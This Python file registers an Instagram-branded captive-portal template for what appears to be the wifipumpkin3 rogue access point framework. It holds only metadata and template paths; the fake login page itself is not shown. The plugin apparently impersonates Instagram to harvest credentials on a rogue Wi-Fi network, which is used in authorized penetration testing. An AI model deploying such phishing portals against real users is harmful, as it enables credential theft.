# content file: instagram.py
from wifipumpkin3.plugins.captiveflask.plugin import CaptiveTemplatePlugin
import wifipumpkin3.core.utility.constants as C

class Instagram(CaptiveTemplatePlugin):
    Name = "instagram"
    Version = "1.2"
    Description = "Instagram Portal with Success Page and Redirect to Google"
    Author = "ggoowl"
    TemplatePath = C.TEMPLATES_FLASK + "templates/instagram"
    StaticPath = C.TEMPLATES_FLASK + "templates/instagram/static"
    Preview = C.TEMPLATES_FLASK + "templates/instagram/preview.png"
